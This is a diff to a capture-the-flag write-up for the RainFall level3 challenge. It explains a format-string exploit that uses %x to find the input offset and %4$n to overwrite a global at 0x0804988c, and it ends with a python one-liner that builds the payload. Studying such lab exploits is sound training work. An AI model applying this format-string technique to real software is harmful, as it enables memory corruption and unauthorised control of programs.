@@ -10,9 +10,15 @@ level3@RainFall:~$ ./level3
 AAAA %x %x %x %x
 AAAA 200 b7fd1ac0 b7ff37d0 41414141
 
-This means that if we use the first 4 bytes of our buffer to declare the value of the address,
+AAAA is 0x41414141 in hexadecimal, and it appears as the 4th value consumed by printf. Therefore, the first four bytes of our input can be used as the 4th argument.
+
 We can then use printf to write the current total written size of the buffer into this address with %n
 (with use $4 to select the 4th argument)
+
+We therefore put the address 0x0804988c at the beginning of our input, encoded in little-endian:
+\x8c\x98\x04\x08
+
+We then add 60 bytes of padding so that the number of characters written reaches 64 (0x40) before %4$n is processed.
 
 python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
 
